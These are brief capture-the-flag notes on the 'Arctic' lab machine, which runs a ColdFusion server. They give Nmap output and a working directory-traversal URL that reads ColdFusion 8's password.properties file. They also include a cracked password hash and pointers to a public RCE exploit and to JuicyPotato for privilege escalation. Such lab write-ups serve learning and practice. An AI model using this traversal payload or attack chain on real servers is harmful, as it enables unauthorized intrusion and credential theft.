# Arctic

### Nmap

```
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC
```

### Web Enum

```bash
http://10.10.10.11:8500/CFIDE/administrator/ -> login page coldfusion

```

### Exploitation & PE

```bash
# found exploit
Adobe ColdFusion - Directory Traversal

# reveral password
http://10.10.10.11:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en

# crack password
2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03:happyday

# found public exploit
Adobe ColdFusion 8 - Remote Command Execution (RCE)

# PE
JuicyPotato...
```
